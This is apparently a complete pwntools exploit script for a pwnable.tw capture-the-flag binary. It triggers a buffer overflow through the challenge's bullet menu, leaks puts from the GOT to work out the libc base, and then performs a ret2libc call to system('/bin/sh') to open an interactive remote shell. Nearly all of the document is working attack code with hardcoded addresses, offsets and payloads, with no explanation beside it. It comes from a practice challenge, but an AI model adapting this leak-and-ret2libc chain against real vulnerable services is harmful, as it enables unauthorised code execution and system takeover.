putsPLT = 0x80484a8
putsGOT = 0x804afdc
main_addr = 0x8048954

puts_offset = 0x5f140
system_offset = 0x3a940
binsh_offset = 0x158e8b

from pwn import *

# Please kill the werewolf with silver bullet!
p = remote('chall.pwnable.tw', ' 10103')

elf = ELF('./vuln')
libc = ELF('./libc_32.so.6')
# p = elf.process()
# gdb.attach(p, '''b *power_up+135''')

def create(name):
	p.sendlineafter(b'Your choice :', b'1')
	p.sendafter(b'of bullet :', name)
	p.recvuntil(b'Good luck !!\n')

def power_up(name):
	p.sendlineafter(b'Your choice :', b'2')
	p.sendafter(b'of bullet :', name)
	p.recvuntil(b'Enjoy it !\n')

def beat():
	p.sendlineafter(b'Your choice :', b'3')

# leak libc address
create(b'A' * 0x2f)
power_up(b'B')
payload = b'\xff\xff\xff' + b'C' * 4 
payload += p32(putsPLT) + p32(main_addr) + p32(putsGOT)
power_up(payload)
beat()

p.recvuntil(b'Oh ! You win !!\n')

puts_libc = u32(p.recv(4))
libc_base = puts_libc - puts_offset
system_libc = libc_base + system_offset
binsh_libc = libc_base + binsh_offset


log.success('Addr puts: ' + hex(puts_libc))
log.success('Addr Libc base: ' + hex(libc_base))
log.success('Addr system: ' + hex(system_libc))
log.success('Addr "/bin/sh": ' + hex(binsh_libc))

# ret2libc
create(b'A' * 0x2f)
power_up(b'B')
payload = b'\xff\xff\xff' + b'C' * 4 
payload += p32(system_libc) + p32(main_addr) + p32(binsh_libc)
power_up(payload)
beat()

p.interactive()






